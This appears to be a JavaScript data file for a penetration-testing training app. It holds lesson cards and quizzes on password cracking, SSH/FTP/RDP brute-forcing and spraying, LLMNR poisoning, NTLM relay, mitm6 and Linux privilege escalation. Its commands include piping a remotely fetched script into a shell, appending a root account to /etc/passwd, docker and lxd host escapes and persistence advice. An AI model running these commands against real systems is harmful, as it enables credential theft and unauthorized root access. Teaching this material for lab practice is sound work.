    "crack-mscache2": {"lead":"A DCC2 blob cracks slowly to a real domain password; worth the wait when it is the only credential you have.","items":[
      {"t":"Crack with hashcat mode 2100","d":"$DCC2$ is mode 2100 and deliberately slow (10240 iterations), so use a focused wordlist, not brute force.","demo":[{"run":"hashcat -m 2100 dcc2.hash rockyou.txt","out":"$DCC2$10240#jsmith#a1b2c3...:Autumn2023\nStatus: Cracked","sig":":Autumn2023"}],"note":"jsmith's domain password is Autumn2023; the plaintext works everywhere the cached blob could not."},
      {"t":"Know it cannot be passed","d":"DCC2 is a one-way verifier, not an NT hash, so there is no pass-the-hash; cracking is the only route.","demo":[{"run":"nxc smb <target> -u jsmith -H '$DCC2$10240#jsmith#a1b2c3...'","out":"[-] Invalid hash format, expected 32 hex characters","sig":"Invalid hash format"}],"note":"The hash is rejected because DCC2 is not passable; crack it or it is useless."},
      {"t":"Budget for the speed","d":"At 10240 iterations DCC2 cracks orders of magnitude slower than NTLM; only weak passwords fall in reasonable time.","demo":[{"run":"hashcat -m 2100 dcc2.hash rockyou.txt --status | grep Speed","out":"Speed.#1.........:    95200 H/s","sig":"95200 H/s"}],"note":"95 kH/s versus billions for NTLM; budget the time or move to another credential."}]},
    "online-brute-ssh": {"lead":"When quieter options are gone, a tight hydra run against SSH can recover a login; go slow to avoid lockout.","items":[
      {"t":"Spray a small password set","d":"hydra with a short, sensible list and a low -t beats blasting rockyou and stays under the radar.","demo":[{"run":"hydra -l jsmith -P top20.txt -t 4 ssh://<target>","out":"[22][ssh] host: <target>   login: jsmith   password: Summer2024","sig":"login: jsmith   password: Summer2024"}],"note":"jsmith:Summer2024 works over SSH; log in and start local enumeration."},
      {"t":"Try credential reuse first","d":"Spray a password you already recovered across the user list; reuse is faster and far quieter than any brute.","demo":[{"run":"hydra -L users.txt -p 'P@ssw0rd2024' ssh://<target>","out":"[22][ssh] host: <target>   login: backup   password: P@ssw0rd2024","sig":"login: backup"}],"note":"One known password sprayed across users found backup; reuse beats brute every time."},
      {"t":"Stop when it is key-only","d":"A 'Permission denied (publickey)' means passwords are disabled entirely; brute-forcing is pointless, hunt for a key.","demo":[{"run":"ssh jsmith@<target>","out":"Permission denied (publickey).","sig":"Permission denied (publickey)"}],"note":"publickey-only means no amount of password guessing works; find an id_rsa instead."}]},
    "online-brute-ftp": {"lead":"After anonymous and loot fail, a careful hydra run against FTP can recover a login that often reuses elsewhere.","items":[
      {"t":"Brute with a tight list","d":"hydra against ftp:// with small user and password lists; a recovered FTP login frequently reuses onto SSH or web.","demo":[{"run":"hydra -L users.txt -P top20.txt ftp://<target>","out":"[21][ftp] host: <target>   login: ftpuser   password: ftp123","sig":"login: ftpuser   password: ftp123"}],"note":"ftpuser:ftp123 is in; check at once whether it reuses on SSH or the web app."},
      {"t":"Confirm before trusting hydra","d":"Some FTP servers accept any login, so verify the credential with a real client before relying on it.","demo":[{"run":"curl ftp://ftpuser:ftp123@<target>/","out":"drwxr-xr-x  2 ftpuser ftpuser  4096 uploads","sig":"uploads"}],"note":"A real directory listing confirms the credential is genuine, not a hydra false positive."},
      {"t":"Keep it quiet to avoid bans","d":"A burst of failures can lock the account or ban your IP; keep -t low and the list short.","demo":[{"run":"hydra -L users.txt -P big.txt -t 16 ftp://<target>","out":"[ERROR] too many connections from your IP","sig":"too many connections"}],"note":"Too aggressive and the server cuts you off; dial -t down and trim the list."}]},
    "online-brute-rdp": {"lead":"RDP brute-forcing is a late move: spray a couple of passwords across users, never many at one account.","items":[
      {"t":"Spray one password across users","d":"One password against many users (spraying) avoids locking any single account, unlike classic brute force.","demo":[{"run":"hydra -L users.txt -p 'Winter2024!' rdp://<target>","out":"[3389][rdp] host: <target>   login: helpdesk   password: Winter2024!","sig":"login: helpdesk"}],"note":"Spraying found helpdesk:Winter2024! without risking a lockout on any one account."},
      {"t":"Validate with netexec","d":"nxc rdp confirms the credential actually grants RDP before you connect; hydra's RDP module can be flaky.","demo":[{"run":"nxc rdp <target> -u helpdesk -p 'Winter2024!'","out":"RDP  <target>  3389  WS01  [+] corp.local\\helpdesk:Winter2024! (Pwn3d!)","sig":"(Pwn3d!)"}],"note":"Pwn3d! confirms genuine RDP access; connect with xfreerdp next."},
      {"t":"Read the lockout policy first","d":"Stay below the lockout count (often 5): one or two passwords per round, then wait out the window.","demo":[{"run":"nxc smb <target> -u '' -p '' --pass-pol","out":"Account Lockout Threshold: 5\nLockout Duration: 30 minutes","sig":"Account Lockout Threshold: 5"}],"note":"Reading the policy tells you how many attempts are safe before accounts lock."}]},
    "responder-poison": {"lead":"On the LAN with no creds, Responder answers broken name lookups and harvests the hashes that follow.","items":[
      {"t":"Poison LLMNR and NBT-NS","d":"When a host mistypes a share name, it broadcasts who-has; Responder answers and captures the authentication that follows.","demo":[{"run":"sudo responder -I eth0","out":"[*] Listening for events...\n[SMB] NTLMv2-SSP Hash : jsmith::CORP:1122334455667788:A1B2...","sig":"NTLMv2-SSP Hash"}],"note":"A captured NTLMv2 hash for jsmith arrived passively; crack it or relay it next."},
      {"t":"Analyze before you poison","d":"-A watches without answering, so you see which hosts and queries are live before you start capturing (and alerting).","demo":[{"run":"sudo responder -I eth0 -A","out":"[Analyze mode: ON]\n[*] LLMNR query for 'fileshare' from 10.10.10.60","sig":"LLMNR query for"}],"note":"Analyze mode proves the traffic is there; drop -A to actually capture it."},
      {"t":"Find the hashes afterward","d":"Every capture is written to /usr/share/responder/logs; read them there if one scrolled past.","demo":[{"run":"ls /usr/share/responder/logs/","out":"SMB-NTLMv2-SSP-10.10.10.60.txt\nAnalyzer-Session.log","sig":"SMB-NTLMv2-SSP"}],"note":"The per-host NTLMv2 files are your captured hashes, ready to crack."}]},
    "ntlm-relay-attack": {"lead":"Instead of cracking a captured hash, relay the live authentication to a host that does not require signing.","items":[
      {"t":"Relay to SMB for a dump or shell","d":"ntlmrelayx forwards the auth to a signing-disabled target; you can dump its SAM or drop a shell as the relayed user.","demo":[{"run":"sudo impacket-ntlmrelayx -tf targets.txt -smb2support","out":"[*] Authenticating against smb://10.10.10.8 as CORP/JSMITH SUCCEED\n[*] Dumping SAM hashes","sig":"SUCCEED"}],"note":"The relayed login dumped FILE01's SAM without ever cracking jsmith's hash."},
      {"t":"Turn Responder's SMB/HTTP off first","d":"Responder and ntlmrelayx both want 445 and 80; disable them in Responder.conf so the relay catches the auth.","demo":[{"run":"grep -E 'SMB|HTTP' /etc/responder/Responder.conf","out":"SMB = Off\nHTTP = Off","sig":"SMB = Off"}],"note":"With Responder's own servers off, the authentication flows to ntlmrelayx to be relayed."},
      {"t":"Relay to LDAP for delegation","d":"Relaying to LDAP/S on a DC can grant resource-based delegation or add a computer account, a path to domain privilege.","demo":[{"run":"sudo impacket-ntlmrelayx -t ldaps://dc01 --delegate-access","out":"[*] Delegate access granted to attacker$ over FILE01","sig":"Delegate access granted"}],"note":"The relay set up RBCD, a foothold to impersonate users on FILE01."}]},
    "mitm6-ipv6-takeover": {"lead":"mitm6 becomes the victim's DNS over unused IPv6, then relays the authentication to a DC.","items":[
      {"t":"Run mitm6 as the rogue DHCPv6/DNS","d":"mitm6 answers DHCPv6 and poisons DNS for the domain; -d scopes it to your target to limit the blast radius.","demo":[{"run":"sudo mitm6 -d corp.local","out":"IPv6 address assigned to 10.10.10.60\nDNS query for wpad.corp.local poisoned","sig":"poisoned"}],"note":"The victim now uses you as DNS; its next authentication goes where you point it."},
      {"t":"Pair it with ntlmrelayx to LDAP","d":"mitm6 feeds the authentication to ntlmrelayx aimed at the DC's LDAP, which can create a rogue computer account.","demo":[{"run":"sudo impacket-ntlmrelayx -6 -t ldaps://dc01 -wh wpad.corp.local --delegate-access","out":"[*] Authenticating against ldaps://dc01 as CORP/WS01$ SUCCEED","sig":"SUCCEED"}],"note":"A machine account authenticated through mitm6 and was relayed to the DC; delegation is next."},
      {"t":"Scope and time it","d":"mitm6 is disruptive, so scope to one domain and have the relay already listening, since DHCPv6 leases are short.","demo":[{"run":"sudo mitm6 -d corp.local --ignore-nofqdn","out":"Sending spoofed reply for wpad.corp.local\nRenew lease requested by WS01","sig":"Sending spoofed reply"}],"note":"The window is brief; ntlmrelayx must be running before you start mitm6."}]}
  };
  Object.keys(CREDS_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = CREDS_HOW[k]; });

  // Bespoke "your turn" for the creds lane. First choice is the move; distractors are plausible
  // format/service confusions or sequencing mistakes; each coach teaches the distinction.
  var CREDS_PRACTICE = {
    "crack-identify": {situation:"secretsdump handed you a bare 32-hex string and you are not sure how to crack it. What first?", choices:["crack-identify","crack-ntlm","crack-netntlmv2","crack-shadow"], coach:{"crack-ntlm":"Probably right if it is an NT hash, but confirm the type first; a 32-hex string could be NTLM or MD5.","crack-netntlmv2":"That is a five-field user::DOMAIN: hash, not a bare 32-hex string. Identify before picking a mode.","crack-shadow":"Unix hashes start with a $ prefix; this is bare hex. Name it before cracking."}},
    "crack-kerberoast": {situation:"GetUserSPNs returned a $krb5tgs$23$ hash for svc_sql. What next?", choices:["crack-kerberoast","crack-asrep-offline","crack-ntlm","kerberoast"], coach:{"crack-asrep-offline":"That cracks $krb5asrep$ (pre-auth disabled); this is $krb5tgs$ from Kerberoasting, hashcat mode 13100.","crack-ntlm":"Wrong format. A $krb5tgs$ ticket is mode 13100, not an NT hash.","kerberoast":"Already done, that is what produced the ticket. Now crack it offline."}},
    "crack-asrep-offline": {situation:"GetNPUsers returned a $krb5asrep$23$ hash for tgibson. What next?", choices:["crack-asrep-offline","crack-kerberoast","password-spray","crack-ntlm"], coach:{"crack-kerberoast":"That cracks $krb5tgs$ service tickets; this is $krb5asrep$ from a pre-auth-disabled user, mode 18200.","password-spray":"You could spray, but you are holding a hash that may crack to a real password in seconds. Cash it first.","crack-ntlm":"Wrong format. AS-REP is mode 18200, not an NT hash."}},
    "crack-ntlm": {situation:"secretsdump dumped the local Administrator NT hash. What is the smart first move?", choices:["crack-ntlm","own-domain-pth","crack-netntlmv2","crack-mscache2"], coach:{"own-domain-pth":"Passing the hash is smart to try, but that move is the domain-owned endgame with the DA hash; a local admin hash is for lateral reuse, which the crack-ntlm bench's nxc -H check covers.","crack-netntlmv2":"Different format. An NT hash is mode 1000 and passable; a NetNTLMv2 capture is neither.","crack-mscache2":"That is for $DCC2$ cached logons; a SAM NT hash is mode 1000 and much faster."}},
    "crack-netntlmv2": {situation:"Responder captured jsmith::CORP:... but SMB signing is required on every host. What now?", choices:["crack-netntlmv2","ntlm-relay-attack","crack-ntlm","responder-poison"], coach:{"ntlm-relay-attack":"Relaying is the usual move, but signing is required everywhere, so there is nothing to relay to. Cracking is the only route left.","crack-ntlm":"That blob is NetNTLMv2 (mode 5600), not a passable NT hash (1000).","responder-poison":"Already done, that is what captured the hash. Now use it."}},
    "crack-shadow": {situation:"You are root on a Linux box and /etc/shadow shows root:$6$... What next?", choices:["crack-shadow","crack-ntlm","crack-mscache2","crack-identify"], coach:{"crack-ntlm":"That is for Windows NT hashes; $6$ is Linux sha512crypt, mode 1800.","crack-mscache2":"Wrong platform. $DCC2$ is Windows cached logons; $6$ is Linux shadow.","crack-identify":"The $6$ prefix already tells you the type (sha512crypt); no identification step needed."}},
    "crack-archive": {situation:"A readable SMB share held backup.zip and it is password-protected. What next?", choices:["crack-archive","crack-identify","crack-ntlm","online-brute-ftp"], coach:{"crack-identify":"You already know it is a zip; zip2john gives the hash directly, so no separate identify step is needed.","crack-ntlm":"Different world. This is an encrypted archive, not a Windows hash.","online-brute-ftp":"Wrong vector. The archive cracks offline with zip2john; no network brute needed."}},
    "crack-mscache2": {situation:"A workstation secretsdump leaked $DCC2$ cached logons. What do you know going in?", choices:["crack-mscache2","crack-ntlm","own-domain-pth","crack-identify"], coach:{"crack-ntlm":"DCC2 is not an NT hash and cannot be passed; it is mode 2100 and must be cracked.","own-domain-pth":"You cannot pass a DCC2 blob; there is no hash to pass, only a slow crack.","crack-identify":"The $DCC2$ prefix already identifies it; skip straight to mode 2100."}},
    "online-brute-ssh": {situation:"SSH is open, you have a username list, and nothing else has worked. What now?", choices:["online-brute-ssh","online-brute-ftp","responder-poison","crack-shadow"], coach:{"online-brute-ftp":"Only if FTP is open; the service in front of you is SSH.","responder-poison":"That harvests hashes on a LAN; it does nothing against a single SSH service.","crack-shadow":"You need to be on the box with /etc/shadow first; brute-forcing SSH is how you might get there."}},
    "online-brute-ftp": {situation:"FTP is open, anonymous login was refused, and loot turned up nothing. What now?", choices:["online-brute-ftp","recon-ftp","online-brute-ssh","crack-archive"], coach:{"recon-ftp":"That is the anonymous and enumeration step, which already failed; a credentialed brute is the fallback.","online-brute-ssh":"Only if SSH is open; the open service here is FTP.","crack-archive":"Only if you have a locked archive; you have an FTP service with no login."}},
    "online-brute-rdp": {situation:"RDP is open, no credential works, and the domain has a lockout policy. What is the safe move?", choices:["online-brute-rdp","crack-netntlmv2","password-spray","rdp-enum"], coach:{"crack-netntlmv2":"Unrelated. That cracks a captured hash; here you have no hash, just an open RDP service.","password-spray":"Spraying the domain over SMB is the quieter cousin and often better, but if RDP is all you have, a slow one-password RDP spray works; either way, stay under the lockout count.","rdp-enum":"That reads the NLA mode or validates a credential you already hold; here you have none, so you must spray carefully."}},
    "responder-poison": {situation:"You have a foothold on the internal LAN but no credentials at all. What is a quiet first move?", choices:["responder-poison","ntlm-relay-attack","mitm6-ipv6-takeover","password-spray"], coach:{"ntlm-relay-attack":"Relaying needs a capture to relay first; Responder is what gets you that capture.","mitm6-ipv6-takeover":"A heavier, noisier cousin for when IPv4 poisoning is quiet; start with plain Responder.","password-spray":"Spraying needs a user list and a candidate password; you have neither yet. Poisoning harvests hashes with nothing in hand."}},
    "ntlm-relay-attack": {situation:"Responder is capturing hashes and nxc shows FILE01 has SMB signing disabled. What beats cracking?", choices:["ntlm-relay-attack","crack-netntlmv2","responder-poison","mitm6-ipv6-takeover"], coach:{"crack-netntlmv2":"Cracking works, but a signing-disabled target means you can relay the live auth straight to a shell or SAM dump, no wordlist needed.","responder-poison":"Already running; the point now is to relay what it catches, not just capture.","mitm6-ipv6-takeover":"That is the IPv6 way to source authentication; you already have IPv4 captures, so relay those."}},
    "mitm6-ipv6-takeover": {situation:"Responder has been quiet for an hour on a modern Windows network. What can still work?", choices:["mitm6-ipv6-takeover","responder-poison","ntlm-relay-attack","password-spray"], coach:{"responder-poison":"Already tried and quiet; the unconfigured IPv6 stack is the angle LLMNR poisoning missed.","ntlm-relay-attack":"That is the back half; mitm6 is how you source the authentication to relay when IPv4 is silent.","password-spray":"A fine parallel move if you have a user list, but it does not exploit the IPv6 gap mitm6 targets."}}
  };
  Object.keys(CREDS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = CREDS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // linux privesc lead-ups: reached from a foothold and the enumeration sweep that surfaced the lead.
  // Commands run on the target (where: host). Multi-route only where a genuine second path exists.
  var LINUX_LEADUPS = {
    "linux-enum": [
      { key: "foothold", label: "A web exploit landed a shell", steps: [
        { title: "Confirm who you are", tool: "id", where: "host", cmd: "id", out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", sig: "www-data", teach: "You hold an unprivileged shell; the first job is a full local sweep to find the way up." } ] },
    ],
    "sudo-abuse": [
      { key: "enum", label: "The sweep flagged a sudo entry", steps: [
        { title: "linpeas flagged sudo rights", tool: "linpeas", where: "host", cmd: "./linpeas.sh | grep -iA2 'sudo -l'", out: "User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find", sig: "NOPASSWD: /usr/bin/find", teach: "A NOPASSWD sudo entry on a GTFOBins binary is a clean, loud-green path to root." } ] },
      { key: "manual", label: "You checked sudo -l by hand", steps: [
        { title: "sudo -l listed a NOPASSWD rule", tool: "sudo", where: "host", cmd: "sudo -l", out: "User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find", sig: "NOPASSWD: /usr/bin/find", teach: "sudo -l is the very first thing to run; it needs no password to list your rights." } ] },
    ],
    "writable-passwd": [
      { key: "enum", label: "The sweep flagged a writable /etc/passwd", steps: [
        { title: "Check the permissions on /etc/passwd", tool: "ls", where: "host", cmd: "ls -l /etc/passwd", out: "-rw-rw-r-- 1 root root 2341 /etc/passwd", sig: "-rw-rw-r--", teach: "A group- or world-writable /etc/passwd lets you add a root user or paste in a known hash." } ] },
    ],
    "nfs-squash": [
      { key: "enum", label: "An export carried no_root_squash", steps: [
        { title: "Read the NFS exports", tool: "cat", where: "host", cmd: "cat /etc/exports", out: "/srv/share   *(rw,sync,no_root_squash)", sig: "no_root_squash", teach: "no_root_squash trusts your remote root; mount the export and run a SUID shell you built as root." } ] },
    ],
    "lxc-lxd-escape": [
      { key: "id", label: "id showed the lxd group", steps: [
        { title: "Read your group memberships", tool: "id", where: "host", cmd: "id", out: "uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)", sig: "110(lxd)", teach: "Membership in lxd is root without a password; everything after this is procedure." } ] },
    ],
    "docker-socket": [
      { key: "id", label: "id showed the docker group", steps: [
        { title: "Read your group memberships", tool: "id", where: "host", cmd: "id", out: "uid=1000(user) gid=1000(user) groups=1000(user),999(docker)", sig: "999(docker)", teach: "The docker group commands the root docker daemon, which is root on the host." } ] },
    ],
    "suid-gtfobins": [
      { key: "enum", label: "The sweep flagged an uncommon SUID", steps: [
        { title: "linpeas highlighted a SUID binary", tool: "linpeas", where: "host", cmd: "./linpeas.sh | grep -i 'SUID'", out: "-rwsr-xr-x 1 root root /usr/bin/find  (Unknown SUID binary)", sig: "/usr/bin/find", teach: "An uncommon SUID binary is a GTFOBins lookup away from a root shell." } ] },
      { key: "manual", label: "You searched for SUID bits yourself", steps: [
        { title: "find listed the SUID binaries", tool: "find", where: "host", cmd: "find / -perm -4000 -type f 2>/dev/null", out: "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find", sig: "/usr/bin/find", teach: "find -perm -4000 lists every SUID file; the odd one out against a default set is the lead." } ] },
    ],
    "pspy-monitor": [
      { key: "stuck", label: "No sudo and no SUID lead", steps: [
        { title: "The easy paths were closed", tool: "sudo", where: "host", cmd: "sudo -l", out: "Sorry, user www-data may not run sudo on this host.", sig: "may not run sudo", teach: "With sudo and SUID dry, watch the process list for a root job that is not in any crontab you can read." } ] },
    ],
    "cron-abuse": [
      { key: "pspy", label: "pspy caught a root job", steps: [
        { title: "pspy showed a recurring root process", tool: "pspy", where: "host", cmd: "./pspy64", out: "2024/01/01 12:02:01 CMD: UID=0  PID=1123  /bin/bash /opt/backup.sh", sig: "UID=0  PID=1123  /bin/bash /opt/backup.sh", teach: "A root job firing on a schedule is yours if you can write to the script or the files it reads." } ] },
    ],
    "capabilities": [
      { key: "enum", label: "getcap found a dangerous capability", steps: [
        { title: "The sweep flagged a file capability", tool: "getcap", where: "host", cmd: "getcap -r / 2>/dev/null", out: "/usr/bin/python3.8 = cap_setuid+ep", sig: "cap_setuid+ep", teach: "cap_setuid on an interpreter lets it set uid 0: root with no SUID bit and no sudo." } ] },
    ],
    "linux-loot-hunt": [
      { key: "foothold", label: "You have a shell and want credentials", steps: [
        { title: "You landed an unprivileged shell", tool: "id", where: "host", cmd: "id", out: "uid=1000(user) gid=1000(user) groups=1000(user)", sig: "uid=1000(user)", teach: "Before escalating, sweep home dirs, configs, and shell history for passwords and keys left lying around." } ] },
    ],
    "linux-persistence": [
      { key: "rooted", label: "You just became root", steps: [
        { title: "A privesc gave you root", tool: "id", where: "host", cmd: "id", out: "uid=0(root) gid=0(root) groups=0(root)", sig: "uid=0(root)", teach: "With root in hand, drop a quiet way back in before you risk losing the shell." } ] },
    ]
  };
  Object.keys(LINUX_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = LINUX_LEADUPS[k]; });

  // Field notes for the linux privesc lane, every item a playable demo (GTFOBins-accurate, real output).
  var LINUX_HOW = {
    "linux-enum": {"lead":"Enumeration is privesc: a good sweep hands you the exact lead, so run the tools and read what they flag.","items":[
      {"t":"Run an automated sweep (linpeas)","d":"linpeas colour-codes findings; the 99% lines are near-certain wins. Serve it from your box and pipe it into a shell.","demo":[{"run":"curl -s http://<lhost>/linpeas.sh | sh | grep -iB1 '99%'","out":"[+] Checking sudo tokens\n/usr/bin/awk (NOPASSWD sudo)  Highlighted 99%","sig":"/usr/bin/awk (NOPASSWD sudo)"}],"note":"A 99%-confidence line is linpeas telling you this is the way up; start there."},
      {"t":"Hit the manual checklist","d":"Even without linpeas the core checks are seconds: id, sudo -l, SUID, kernel, cron.","demo":[{"run":"id; sudo -l 2>/dev/null; uname -r","out":"uid=33(www-data) gid=33(www-data)\n(root) NOPASSWD: /usr/bin/awk\n5.4.0-42-generic","sig":"NOPASSWD: /usr/bin/awk"}],"note":"Three commands surfaced a NOPASSWD awk and the kernel version; both are leads."},
      {"t":"Check the kernel for known exploits","d":"A dated kernel maps to CVEs (PwnKit, DirtyPipe, OverlayFS); match uname -r with searchsploit as a fallback.","demo":[{"run":"uname -r","out":"4.4.0-116-generic","sig":"4.4.0-116-generic"}],"note":"4.4.0-116 predates many patches; a kernel exploit is the last resort when config paths fail."}]},
    "sudo-abuse": {"lead":"sudo -l lists what you may run as root; GTFOBins turns almost any entry into a shell.","items":[
      {"t":"Read your sudo rights","d":"sudo -l shows the exact binaries and NOPASSWD flags; each allowed binary is a GTFOBins lookup.","demo":[{"run":"sudo -l","out":"User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find","sig":"NOPASSWD: /usr/bin/find"}],"note":"find with sudo is a one-liner to root through its -exec."},
      {"t":"Spawn a root shell via GTFOBins","d":"The GTFOBins sudo entry gives the exact escape; for find it is -exec /bin/sh.","demo":[{"run":"sudo find . -exec /bin/sh \\; -quit","out":"# id\nuid=0(root) gid=0(root) groups=0(root)","sig":"uid=0(root)"}],"note":"find ran /bin/sh as root because sudo ran find as root; that is the whole trick."},
      {"t":"Abuse LD_PRELOAD when env_keep is set","d":"If sudo -l shows env_keep+=LD_PRELOAD, a tiny shared object that runs on load gives root with any allowed binary.","demo":[{"run":"sudo LD_PRELOAD=/tmp/x.so apache2","out":"# id\nuid=0(root) gid=0(root)","sig":"uid=0(root)"}],"note":"env_keep LD_PRELOAD loads your library as root before the program even starts."}]},
    "suid-gtfobins": {"lead":"A SUID binary runs as its owner (often root); GTFOBins says which ones hand you a shell.","items":[
      {"t":"List every SUID binary","d":"find -perm -4000 lists all SUID files; compare against a stock system to spot the planted one.","demo":[{"run":"find / -perm -4000 -type f 2>/dev/null","out":"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/base64","sig":"/usr/bin/base64"}],"note":"base64 is not SUID by default; its presence here is the intended lead."},
      {"t":"Read a root file through a SUID binary","d":"Even a harmless SUID like base64 reads root-only files, because it runs as root.","demo":[{"run":"base64 /etc/shadow | base64 -d","out":"root:$6$Xq2$9Zk...:19876:0:99999:7:::","sig":"root:$6$"}],"note":"SUID base64 read /etc/shadow; crack the hash or look for a full shell escape."},
      {"t":"Get a shell from a SUID binary","d":"The GTFOBins SUID section gives the escape; for find it is -exec, and -p keeps the SUID euid.","demo":[{"run":"/usr/bin/find . -exec /bin/sh -p \\; -quit","out":"# id\nuid=33(www-data) euid=0(root)","sig":"euid=0(root)"}],"note":"-p keeps euid 0 from the SUID bit, so the shell is effectively root."}]},
    "writable-passwd": {"lead":"A writable /etc/passwd lets you mint a root account, no cracking needed.","items":[
      {"t":"Confirm it is writable","d":"ls -l shows the perms; a w for group or other on /etc/passwd is the whole vulnerability.","demo":[{"run":"ls -l /etc/passwd","out":"-rw-rw-r-- 1 root root 2341 /etc/passwd","sig":"-rw-rw-r--"}],"note":"The group-write bit means you can append a new root line."},
      {"t":"Add a root user with a known password","d":"openssl passwd makes a crypt hash; append a uid-0 line using it, then su to the new user.","demo":[{"run":"echo 'hacker:$1$xyz$9Qc8f6rJx0vK2pT1nYd3b.:0:0::/root:/bin/bash' >> /etc/passwd && tail -1 /etc/passwd","out":"hacker:$1$xyz$9Qc8f6rJx0vK2pT1nYd3b.:0:0::/root:/bin/bash","sig":":0:0::/root:/bin/bash"}],"note":"uid 0 makes hacker root; su hacker with the chosen password is instant root."},
      {"t":"Or overwrite root's own hash","d":"If you cannot add a line, replace root's password field with a hash you know, then su root.","demo":[{"run":"openssl passwd -1 -salt abc newpass","out":"$1$abc$kQjT9.0h8n/","sig":"$1$abc$"}],"note":"Paste this hash into root's password field, then su root with newpass."}]},
    "nfs-squash": {"lead":"no_root_squash lets your local root write a SUID shell the target honours; build it on your box, run it on theirs.","items":[
      {"t":"Confirm the export allows it","d":"Read /etc/exports (or showmount -e) to confirm no_root_squash on a writable path before anything else.","demo":[{"run":"cat /etc/exports","out":"/srv/share   10.10.10.0/24(rw,sync,no_root_squash)","sig":"no_root_squash"}],"note":"no_root_squash plus rw is the exact combination this attack needs."},
      {"t":"Plant a root-owned SUID shell from your box","d":"As root on Kali, mount the export, copy a shell, and set it SUID; the server trusts your uid 0, so the bit sticks.","demo":[{"run":"sudo mount -t nfs <target>:/srv/share /mnt && sudo cp /bin/bash /mnt/rootbash && sudo chmod +s /mnt/rootbash && ls -l /mnt/rootbash","out":"-rwsr-sr-x 1 root root 1234376 /mnt/rootbash","sig":"-rwsr-sr-x 1 root root"}],"note":"The SUID root bash now sits on the share, owned by root, waiting on the target. If the target's libc differs from Kali's, compile a tiny static setuid-exec wrapper instead of copying bash."},
      {"t":"Run it as root on the target","d":"Back in your target shell the same file is at /srv/share; run it with -p to keep euid 0.","demo":[{"run":"/srv/share/rootbash -p","out":"rootbash-5.0# id\nuid=33(www-data) euid=0(root)","sig":"euid=0(root)"}],"note":"The SUID bit you set from your box makes it root on the target: euid 0."}]},
    "lxc-lxd-escape": {"lead":"The lxd group runs a privileged container with the host disk mounted; read or write anything as root.","items":[
      {"t":"Import a minimal image","d":"Import any small image (a built Alpine tarball); you only need something to launch a container from.","demo":[{"run":"lxc image import alpine.tar.gz --alias pwn","out":"Image imported with fingerprint a1b2...  alias: pwn","sig":"alias: pwn"}],"note":"Any image works; a tiny Alpine keeps it fast."},
      {"t":"Launch it privileged with the host disk","d":"security.privileged=true plus a disk device mapping / into the container gives root over the host filesystem.","demo":[{"run":"lxc init pwn r -c security.privileged=true && lxc config device add r host disk source=/ path=/mnt/root recursive=true && lxc start r","out":"Device host added to r\n(container r started, host / at /mnt/root)","sig":"/mnt/root"}],"note":"The host root is now /mnt/root inside a container you are root in."},
      {"t":"Read or write host files as root","d":"Inside the container you are root and /mnt/root is the host disk; read the flag or add your key to root.","demo":[{"run":"lxc exec r -- sh -c 'cat /mnt/root/root/root.txt'","out":"d41d8cd98f00b204e9800998ecf8427e","sig":"d41d8cd98f00b204e9800998ecf8427e"}],"note":"You read root's file on the host; writing /mnt/root/root/.ssh works the same way."}]},
    "docker-socket": {"lead":"The docker socket runs containers as root on the host; mount / into one and chroot in.","items":[
      {"t":"Confirm docker access","d":"docker ps (or writing to /var/run/docker.sock) confirms you can command the daemon.","demo":[{"run":"docker ps","out":"CONTAINER ID   IMAGE     COMMAND   STATUS","sig":"CONTAINER ID"}],"note":"If docker ps works, you can launch a container as root on the host."},
      {"t":"Mount the host and chroot","d":"Run a container with -v /:/host, then chroot into /host and you are root on the real filesystem.","demo":[{"run":"docker run -v /:/host -it alpine chroot /host sh","out":"# id\nuid=0(root) gid=0(root)","sig":"uid=0(root)"}],"note":"The container's root is the host's root once / is bind-mounted and chrooted."},
      {"t":"Read a root file to prove it","d":"From a one-shot container, read the host's /etc/shadow or drop a key; no interactive session needed.","demo":[{"run":"docker run -v /:/host alpine cat /host/etc/shadow | head -1","out":"root:$6$Xq2$9Zk...:19876:0:99999:7:::","sig":"root:$6$"}],"note":"Reading the host's /etc/shadow proves full root over the real filesystem."}]},
    "pspy-monitor": {"lead":"pspy shows processes and cron without root, revealing the root tasks crontab hides from you.","items":[
      {"t":"Watch the process list","d":"pspy snoops proc for new processes and their command lines, including short-lived cron children.","demo":[{"run":"./pspy64","out":"2024/01/01 12:00:01 CMD: UID=0  PID=1123  /bin/bash /opt/backup.sh\n2024/01/01 12:02:01 CMD: UID=0  PID=1140  /bin/bash /opt/backup.sh","sig":"UID=0  PID=1123  /bin/bash /opt/backup.sh"}],"note":"A UID=0 job repeating every two minutes is a cron you cannot see in your own crontab: a privesc lead."},
      {"t":"Check whether the script is writable","d":"The timestamps give the schedule; the path is the target if it or its inputs are writable.","demo":[{"run":"ls -l /opt/backup.sh","out":"-rwxrwxrwx 1 root root 214 /opt/backup.sh","sig":"-rwxrwxrwx"}],"note":"World-writable and run by root every two minutes: overwrite it and wait for the tick."},
      {"t":"Catch relative paths and wildcards","d":"pspy -f shows file events too; a root script calling a bare command or tar * is abusable even when the script is read-only.","demo":[{"run":"./pspy64 -f","out":"OPEN: /opt/backup.sh\nCMD: UID=0  tar czf /backup.tgz *","sig":"tar czf /backup.tgz *"}],"note":"A root tar with a wildcard in a writable directory is the classic wildcard-injection path."}]},
    "cron-abuse": {"lead":"A root cron you can influence is root on a timer; overwrite the script, or inject through a tar wildcard.","items":[
